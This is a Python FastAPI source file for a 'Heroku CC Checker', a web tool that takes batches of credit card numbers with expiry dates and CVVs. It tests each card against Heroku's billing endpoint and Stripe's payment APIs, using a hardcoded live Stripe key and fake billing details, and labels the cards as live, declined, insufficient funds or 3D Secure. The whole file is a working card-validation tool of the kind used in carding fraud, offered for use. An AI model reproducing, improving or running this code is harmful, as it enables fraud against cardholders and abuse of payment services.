import os
import sys
import uuid
import asyncio
import json
import httpx
from datetime import datetime
from fastapi import FastAPI, WebSocket, Request
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.templating import Jinja2Templates

# Auto-install required modules
required_modules = ['fastapi', 'httpx', 'uvicorn', 'jinja2']
def install_modules(modules):
    for module in modules:
        try:
            __import__(module.replace('-', '_'))
        except ImportError:
            print(f"{module} not found. Installing...")
            os.system(f"{sys.executable} -m pip install {module}")
            print(f"{module} installed successfully.")

install_modules(required_modules)

app = FastAPI()
templates = Jinja2Templates(directory=".")

# CORS middleware setup
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Heroku CC Checker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: #f0f2f5;
            color: #1a1a1a;
            line-height: 1.6;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        h1 {
            color: #1a73e8;
            font-size: 2rem;
            margin-bottom: 1.5rem;
            text-align: center;
        }

        .input-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            color: #5f6368;
            font-weight: 500;
        }

        input[type="text"], textarea {
            width: 100%;
            padding: 0.75rem;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }

        input[type="text"]:focus, textarea:focus {
            outline: none;
            border-color: #1a73e8;
        }

        textarea {
            min-height: 150px;
            resize: vertical;
        }

        .btn {
            background: #1a73e8;
            color: white;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s ease;
        }

        .btn:hover {
            background: #1557b0;
        }

        .results {
            margin-top: 2rem;
        }

        .result-card {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid #1a73e8;
        }

        .status-success { border-left-color: #34a853; }
        .status-error { border-left-color: #ea4335; }
        .status-pending { border-left-color: #fbbc05; }

        .result-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
            color: #5f6368;
        }

        .result-content {
            font-family: monospace;
            white-space: pre-wrap;
            font-size: 0.9rem;
        }

        .loader {
            display: none;
            text-align: center;
            margin: 1rem 0;
        }

        .loader::after {
            content: '';
            display: inline-block;
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 600px) {
            .container {
                padding: 1rem;
            }

            h1 {
                font-size: 1.5rem;
            }

            .btn {
                padding: 0.6rem 1.2rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Heroku CC Checker</h1>
        <form id="ccForm">
            <div class="input-group">
                <label for="api_key">API Key</label>
                <input type="text" id="api_key" placeholder="Enter your Heroku API key" required>
            </div>
            <div class="input-group">
                <label for="ccs">Credit Cards (max 50)</label>
                <textarea id="ccs" placeholder="Enter cards (one per line)&#10;Format: XXXX|MM|YY|CVV" required></textarea>
            </div>
            <button type="button" class="btn" onclick="submitForm()">Check Cards</button>
        </form>
        <div class="loader" id="loader"></div>
        <div class="results" id="results"></div>
    </div>

    <script>
        let ccs = [];
        let currentIndex = 0;

        function showLoader() {
            document.getElementById('loader').style.display = 'block';
        }

        function hideLoader() {
            document.getElementById('loader').style.display = 'none';
        }

        function addResult(cc, result) {
            const resultsDiv = document.getElementById('results');
            const statusClass = result.status === 'success' ? 'status-success' : 
                              result.status === 'error' ? 'status-error' : 'status-pending';
            
            const resultHtml = `
                <div class="result-card ${statusClass}">
                    <div class="result-header">
                        <span>Card: ${cc}</span>
                        <span>Time: ${result.timestamp}</span>
                    </div>
                    <div class="result-content">
                        Status: ${result.status}
                        Message: ${result.message}
                    </div>
                </div>
            `;
            resultsDiv.insertAdjacentHTML('beforeend', resultHtml);
        }

        async function submitForm() {
            const api_key = document.getElementById('api_key').value.trim();
            const ccInput = document.getElementById('ccs').value.trim();
            
            if (!api_key || !ccInput) {
                alert('Please fill in all fields');
                return;
            }

            ccs = ccInput.split('\\n').map(cc => cc.trim()).filter(cc => cc !== "");
            
            if (ccs.length === 0 || ccs.length > 50) {
                alert("Please enter between 1 and 50 credit cards.");
                return;
            }

            document.getElementById('results').innerHTML = '';
            currentIndex = 0;
            showLoader();
            await checkNextCC(api_key);
            hideLoader();
        }

        async function checkNextCC(api_key) {
            if (currentIndex >= ccs.length) return;

            const cc = ccs[currentIndex];
            try {
                const response = await fetch('/check_cc', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cc, api_key })
                });
                const result = await response.json();
                addResult(cc, result);

                if (result.status === 'success') return;
                
                currentIndex++;
                await checkNextCC(api_key);
            } catch (error) {
                addResult(cc, {
                    status: 'error',
                    message: 'Request failed',
                    timestamp: new Date().toLocaleTimeString()
                });
                currentIndex++;
                await checkNextCC(api_key);
            }
        }
    </script>
</body>
</html>
'''

async def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(url, method="POST", params=None, headers=None, data=None, json_data=None):
    async with httpx.AsyncClient() as client:
        try:
            response = await client.request(method, url, params=params, headers=headers, data=data, json=json_data)
            return response.text
        except httpx.RequestError as e:
            print(f"Request error: {e}")
            return None

async def heroku(cc, api_key, proxy=None):
    try:
        cc_data = cc.split("|")
        if len(cc_data) != 4:
            return {"status": "error", "message": "Invalid CC format"}
            
        cc, mon, year, cvv = cc_data
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        headers = {
            "accept": "application/vnd.heroku+json; version=3",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {api_key}",
            "origin": "https://dashboard.heroku.com",
            "user-agent": "Mozilla/5.0",
        }

        url = "https://api.heroku.com/account/payment-method/client-token"
        req = await make_request(url, headers=headers)
        
        if not req:
            return {"status": "error", "message": "Failed to get client token"}
            
        client_secret = await parseX(req, '"token":"', '"')

        headers2 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }

        data = {
            "type": "card",
            "billing_details[name]": "John Doe",
            "billing_details[address][city]": "City",
            "billing_details[address][country]": "US",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mon,
            "card[exp_year]": year,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
        }

        req2 = await make_request("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data)
        if not req2 or "pm_" not in req2:
            return {"status": "error", "message": "Invalid Card"}

        json_sec = json.loads(req2)
        pmid = json_sec["id"]
        piid = client_secret.split("_secret_")[0]

        headers3 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }
        
        data3 = {
            "payment_method": pmid,
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
            "client_secret": client_secret,
        }

        req3 = await make_request(f"https://api.stripe.com/v1/payment_intents/{piid}/confirm", headers=headers3, data=data3)
        if not req3:
            return {"status": "error", "message": "Failed to confirm payment"}

        ljson = json.loads(req3)
        if '"status": "succeeded"' in req3:
            return {"status": "success", "message": "Card Added Successfully"}
        elif "insufficient_funds" in req3:
            return {"status": "insufficient_funds", "message": "Card Live - Insufficient Funds"}
        elif "decline_code" in req3:
            return {"status": "declined", "message": ljson["error"]["decline_code"]}
        elif "requires_action" in req3:
            return {"status": "3d_secure", "message": "3D Secure Required"}
        elif "error" in req3:
            return {"status": "error", "message": ljson["error"]["message"]}
        else:
            return {"status": "unknown", "message": "Unknown Response"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/", response_class=HTMLResponse)
def index(request: Request):
    return HTMLResponse(content=HTML_TEMPLATE)

@app.post("/check_cc")
async def check_cc(request: Request):
    data = await request.json()
    cc = data.get('cc')
    api_key = data.get('api_key')
    proxy = data.get('proxy')

    result = await heroku(cc, api_key, proxy)
    result['timestamp'] = datetime.now().strftime('%H:%M:%S')
    return result

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    while True:
        data = await websocket.receive_json()
        await websocket.send_json({"status": "Message received", "data": data})

if __name__ == '__main__':
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
